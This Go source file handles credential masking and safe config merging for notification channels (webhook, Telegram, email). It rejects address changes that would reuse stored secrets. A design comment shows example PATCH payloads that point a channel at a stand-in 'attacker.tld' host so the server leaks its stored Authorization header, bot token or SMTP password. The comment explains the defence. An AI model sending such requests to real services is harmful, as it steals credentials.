package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix is the marker prefix for a masked value. The API echoes a
// credential back with a value carrying this prefix, and when the update endpoint
// receives a value with this prefix it understands it as "keep the stored value
// unchanged".
//
// A prefix is used rather than an empty string or some fixed constant so that a
// little identifying information can ride along (see MaskedValue), letting the
// user tell "which bot this is" without having to re-paste the secret.
const MaskedPrefix = "__masked__"

// MaskedValue produces a masked value:
//
//	"__masked__"              the original is too short; give no hint
//	"__masked__:…ab12cd"      carry the last 6 characters as an identifying hint
//
// Exposing only the last 6 characters is deliberate: a Webhook address's
// identifying information is in its tail (such as WeCom's key or Feishu's bot id),
// whereas the prefix part is the same across bots and has no identifying value.
// Six characters are not enough to reconstruct the credential, but enough for the
// configurer to recognize "that's my group".
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked reports whether a value is a masked value (i.e. unchanged after the API
// echoed it back).
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig returns a copy of the config with the channel's credential fields
// replaced by masked values.
//
// An unknown channel type returns an empty map rather than the original config —
// better to have the UI show "config unavailable" than to spit the whole possibly
// credential-bearing original back when the channel type cannot be recognized.
// Non-credential fields are preserved as-is so the UI can display them normally.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// A nested structure like headers is treated as a single credential as a
		// whole: judging each sub-key would require every channel to declare its own
		// "which sub-keys are credentials" rules, complexity far beyond the benefit.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials means "the destination address changed,
// but the caller did not take a position on the credential fields". Returning it
// rather than silently proceeding or silently dropping the credentials — see
// PrepareConfigUpdate for the rationale.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // the destination keys that changed
	Missing []string // the credential keys with no explicit position taken
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "the destination address (" + strings.Join(e.Changed, ", ") + ") changed; please also re-enter the credential fields (" +
		strings.Join(e.Missing, ", ") + "): supply a new value, or explicitly leave blank to indicate the credential is no longer needed. " +
		"The old credential is only valid for the old address, and keeping it means handing it to the new address."
}

// PrepareConfigUpdate merges channel config and handles the security-sensitive
// case of a "destination address change".
//
// It replaces the bare MergeConfig on the channel-update path, solving this
// empirically exploitable path: the destination address (where the message is
// sent) and the credentials (what identity it is sent with) are two independent
// sets of fields, and MergeConfig keeps the stored value for any "unmentioned
// key". So anyone who can PATCH a channel only has to **change the address alone
// and say nothing about the credentials** to make the server send the real stored
// credentials to an endpoint they control:
//
//	webhook  {config:{url:"https://attacker.tld"}}  → the original Authorization header goes out with the request
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<realToken>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → hands over the username and password after STARTTLS
//
// This path is entirely silent and does not rely on redirects (so refusing
// cross-host hops does not stop it), and it directly defeats the goal of this
// package's masking mechanism — "credentials are not echoed to the browser".
//
// Rule: as soon as a destination key is changed to a new value, the caller must
// take an explicit position on **every** credential key:
//   - supply a new value → use the new value
//   - explicitly pass an empty string → the field no longer needs a credential
//     (preserving the clear semantics)
//   - echo back the masked value / simply omit the key → reject
//
// The third is also rejected because the meaning of a "masked value" is precisely
// "keep the old credential", and the old credential is only valid for the old
// address. It deliberately does not "drop the credential automatically" — for
// optional credential fields (webhook's headers, email's password) that would
// silently become "auth is gone but the endpoint returns 200", which is harder to
// diagnose than an error. Better to make the operator fill it in once more.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	return (channelConfigUpdate{kind: kind, stored: stored, incoming: incoming}).merge()
}

// rejectMaskedInContainers rejects submitting a masked sentinel embedded inside a
// non-string structure.
//
// The masking mechanism assumes "the whole value is a string". An object field
// like webhook's headers can only be masked as a whole (written as the string
// "__masked__") or submitted as a whole; stuffing the sentinel inside the object
// neither expresses "keep unchanged" nor avoids being stored as a real value.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("field %s contains the mask marker %q: this field can only be left blank as a whole to keep it, or submitted with a new value as a whole; it cannot carry a mask placeholder inside the structure",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue compares whether two config values are equivalent. Comparing via
// JSON serialization also handles type differences — the front end submits the
// port as a number while the database reads it back as float64, so a direct ==
// would misjudge.
//
// "Blank" must be normalized before comparing: an empty string and "the key does
// not exist" are the same state in this config model, because MergeConfig treats
// an empty string as an explicit clear and deletes the key outright. Without
// normalization, an always-blank optional destination field (Telegram's base_url
// is the only such field: blank means use the official address) would take this
// path —
//
//	on creation, base_url:"" is stored  →  the first save has MergeConfig delete the key
//	→ on the second save incoming is "" but stored lacks the key, judged as "address changed"
//	→ the credential is a masked value → 400 "the destination address changed; please also re-enter the credential fields"
//
// From then on every save fails unless the user re-pastes the Bot Token, even
// though they changed nothing.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue decides whether a config value is "blank". The criterion
// must match MergeConfig's clear check (strings.TrimSpace(s) == ""); otherwise a
// gap opens up where "MergeConfig thinks it should be deleted, sameConfigValue
// thinks it has a value".
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig merges incoming on top of stored, for updating channel config.
//
// Rules:
//   - a key whose incoming value is masked → keep the stored value (the user did
//     not change this field)
//   - a key whose incoming value is an empty string → treat as an explicit clear
//     and delete the key
//   - all other keys → overwrite with the incoming value
//   - a key present in stored but absent from incoming → keep it (partial-update
//     semantics)
//
// Whether an empty string counts as "clear" needs to be explicit: the front-end
// form submits an unfilled field as an empty string, and writing it as a valid
// value would actually clear a field that was "left blank to keep the original
// value". We choose explicit clear here, because to clear a misconfigured field
// the user has no other way to express it (dropping the field could distinguish
// "not provided" from "provided empty", but the UI does not use that
// distinction).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // masked value = unchanged, keep stored
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
